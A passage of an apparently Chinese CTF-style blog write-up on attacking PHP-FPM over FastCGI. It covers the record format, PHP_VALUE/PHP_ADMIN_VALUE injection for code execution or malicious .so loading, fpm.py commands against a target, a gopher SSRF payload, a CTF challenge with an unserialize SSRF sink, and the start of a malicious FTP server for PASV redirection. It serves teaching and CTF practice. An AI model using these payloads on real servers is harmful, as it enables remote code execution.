&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socket模式">unix socket模式&lt;/h4>
&lt;p>如果启动fpm不做改动，默认为套接字模式&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后重启即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果出现报错请查看对应日志&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat /var/log/nginx/error.log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat /var/log/php7.4-fpm.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="漏洞成因">漏洞成因&lt;/h2>
&lt;p>按FastCGI协议传输的内容分为header和body两部分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 版本
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本次record的类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本次record对应的请求id
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// body体的大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 额外块大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding&lt;/p>
&lt;p>header中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>当type=4时，表明消息中包含的数据为某个name-value对，比如&lt;/p>
&lt;pre tabindex="0">&lt;code>{
&amp;#39;GATEWAY_INTERFACE&amp;#39;: &amp;#39;FastCGI/1.0&amp;#39;,
&amp;#39;REQUEST_METHOD&amp;#39;: &amp;#39;GET&amp;#39;,
&amp;#39;SCRIPT_FILENAME&amp;#39;: &amp;#39;/var/www/html/index.php&amp;#39;,
&amp;#39;SCRIPT_NAME&amp;#39;: &amp;#39;/index.php&amp;#39;,
&amp;#39;QUERY_STRING&amp;#39;: &amp;#39;?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;REQUEST_URI&amp;#39;: &amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;DOCUMENT_ROOT&amp;#39;: &amp;#39;/var/www/html&amp;#39;,
&amp;#39;SERVER_SOFTWARE&amp;#39;: &amp;#39;php/fcgiclient&amp;#39;,
&amp;#39;REMOTE_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;REMOTE_PORT&amp;#39;: &amp;#39;12345&amp;#39;,
&amp;#39;SERVER_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;SERVER_PORT&amp;#39;: &amp;#39;80&amp;#39;,
&amp;#39;SERVER_NAME&amp;#39;: &amp;#34;localhost&amp;#34;,
&amp;#39;SERVER_PROTOCOL&amp;#39;: &amp;#39;HTTP/1.1&amp;#39;
}
&lt;/code>&lt;/pre>&lt;p>其中&lt;code>SCRIPT_FILENAME&lt;/code>就是php-fpm会去执行的文件，由于5.3.9版本引入了&lt;code>security.limit_extensions&lt;/code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置&lt;code>FASTCGI_PARAMS&lt;/code>来动态修改php的设置，可以利用这两项&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;,
&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On&amp;#39;
&lt;/code>&lt;/pre>&lt;p>来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）&lt;/p>
&lt;h2 id="攻击思路例题">攻击思路&amp;amp;&amp;amp;例题&lt;/h2>
&lt;p>伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去&lt;/p>
&lt;h3 id="远程攻击php-fpm">远程攻击php-fpm&lt;/h3>
&lt;p>这里是&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">p牛的脚本&lt;/a>，兼容py2&amp;amp;3，默认-p 9000，-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们需要改动的只有params部分的&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>成功&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用&lt;code>_&lt;/code>占位即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrf攻击本地php-fpm">SSRF攻击本地php-fpm&lt;/h3>
&lt;p>利用&lt;code>gopher://&lt;/code>协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了&lt;/p>
&lt;p>构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走&lt;/p>
&lt;ul>
&lt;li>p牛脚本生成urlencode之后的tcp数据流&lt;/li>
&lt;li>加gopher://127.0.0.1:9000前缀&lt;/li>
&lt;li>梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="强网青少-2021ssrf">[强网青少 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将序列化之后的结果传入crawldata&lt;/p>
&lt;h3 id="结合ftppasv-mode攻击本地php-fpm">结合ftp&amp;amp;PASV mode攻击本地php-fpm&lt;/h3>
&lt;h4 id="ftp使用pasv模式转发ftp-data">ftp使用PASV模式转发ftp-data&lt;/h4>
&lt;p>先简单测试ftp连接进行抓包&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>其中的&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载&lt;/p>
&lt;p>我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回&lt;code>(127,0,0,1,0,12345)&lt;/code>来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
